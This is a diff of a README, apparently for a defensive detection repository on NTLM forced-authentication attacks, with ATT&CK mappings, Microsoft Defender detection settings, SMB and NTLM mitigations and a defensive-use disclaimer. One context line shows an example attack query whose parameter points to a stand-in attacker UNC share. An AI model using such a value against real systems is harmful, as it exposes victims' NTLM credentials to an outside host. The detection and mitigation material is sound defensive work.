@@ -28,33 +28,39 @@ Attack Flow
 Example:
 search:query=test&crumb=location:\\attacker\share
 
+---
+
 MITRE ATT&CK Mapping
+
 Technique	Description
+
 T1187	Forced Authentication
+
 T1557	Adversary-in-the-Middle
+
 T1110.002	Password Cracking
+
 T1021.002	SMB/Windows Admin Shares
 
 
-
-
+---
 Recommended Defender Configuration
 
 Custom Detection Settings
 
 Setting	Recommendation
 
-Frequency	Every 5 minutes
+1. Frequency	Every 5 minutes
 
-Lookback	1-2 hours
+2. Lookback	1-2 hours
 
-Severity	High
+3. Severity	High
 
 Automated Investigation	Enabled
 
 Incident Creation	Enabled
 
-
+---
 Recommended Mitigations
 
 Block Outbound SMB
@@ -67,11 +73,9 @@ TCP/139
 
 except where explicitly required.
 
-
 Enforce SMB Signing
 
 Reduce NTLM relay attack opportunities.
-
 
 Restrict NTLM Usage
 
@@ -81,7 +85,7 @@ RestrictSendingNTLMTraffic = 2
 
 Audit mode is recommended before enforcement.
 
-
+---
 Detection Philosophy
 
 This repository focuses on behavioral detection rather than CVE-driven detection.
@@ -96,8 +100,9 @@ The objective is to identify:
 	• NTLM credential exposure activity
 regardless of the specific Windows component involved.
 
-
+---
 Disclaimer
 
 This repository is intended for defensive security, threat hunting, detection engineering, and incident response purposes only.
 Always validate detections in a test environment before deploying to production.
+
